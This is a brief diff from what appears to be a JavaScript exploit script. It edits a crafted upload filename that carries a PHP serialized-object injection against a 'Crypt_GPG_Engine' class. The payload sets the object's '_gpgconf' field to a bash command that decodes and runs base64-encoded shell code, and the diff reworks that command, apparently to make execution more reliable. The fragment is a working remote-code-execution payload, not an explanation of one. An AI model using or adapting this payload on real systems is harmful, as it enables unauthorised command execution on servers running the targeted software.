@@ -54,7 +54,7 @@
 
   
 
-  const rawFilename = 'payload.php;|O:16:"Crypt_GPG_Engine":1:{s:8:"_gpgconf";s:68:"bash -c \' $(base64 -d <<< "cmVhZGxpbmsgLWYgLiA+PiAvdG1wL3B3ZA==")\';#";};';
+  const rawFilename = 'payload.php;|O:16:"Crypt_GPG_Engine":1:{s:8:"_gpgconf";s:70:"bash -c \' echo cmVhZGxpbmsgLWYgLiA+PiAvdG1wL3B3ZA== | base64 -d | sh\';#";};';
   const safeFilename = rawFilename.replace(/"/g, '\\"');  // Escape tất cả dấu "
 
   const preamble =
